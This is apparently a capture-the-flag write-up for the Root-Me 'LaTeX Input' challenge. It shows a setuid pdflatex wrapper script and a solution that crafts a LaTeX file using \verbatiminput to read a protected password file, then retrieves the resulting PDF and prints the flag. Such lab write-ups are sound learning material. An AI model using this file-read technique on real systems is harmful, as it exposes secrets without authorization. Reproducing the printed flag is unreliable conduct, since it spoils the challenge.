# Latex Input

URL: [https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)

## Source code 

```bash
#!/usr/bin/env bash
 
if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi
 
if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"
 
    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

[Download](https://www.root-me.org/local/cache-code/6f974f8ac6b697d0c3023a1f854a831e.txt)

## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2222 app-script-ch23@challenge02.root-me.org](ssh://app-script-ch23:app-script-ch23@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2845&ssh=ssh://app-script-ch23:app-script-ch23@challenge02 "WebSSH") |
| Username   | app-script-ch23                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch23                                                                                                                                                                                                                                                                                                                       |

## Solution

GTFOBins [pdflatex](https://gtfobins.github.io/gtfobins/pdflatex/) 

Read the password file:
```bash
app-script-ch23@challenge02:~$ echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/challenge/app-script/ch23/.passwd}\end{document}' > /tmp/ch23
app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/ch23
[+] Compilation ...
[+] Output file : /tmp/tmp.hBI17wIv6w/main.pdf
app-script-ch23@challenge02:~$ ls /tmp/tmp.hBI17wIv6w/main.pdf -lah
-rwxr-x--- 1 app-script-ch23-cracked app-script-ch23 22K Aug 21 16:38 /tmp/tmp.hBI17wIv6w/main.pdf
```

Download pdf:
```bash
➜ scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.hBI17wIv6w/main.pdf .
```

![latex---input.png](/assets/ctf/root-me/latex-input.png)

::: tip Flag
`LaTeX_1nput_1s_n0t_v3ry_s3kur3`
:::

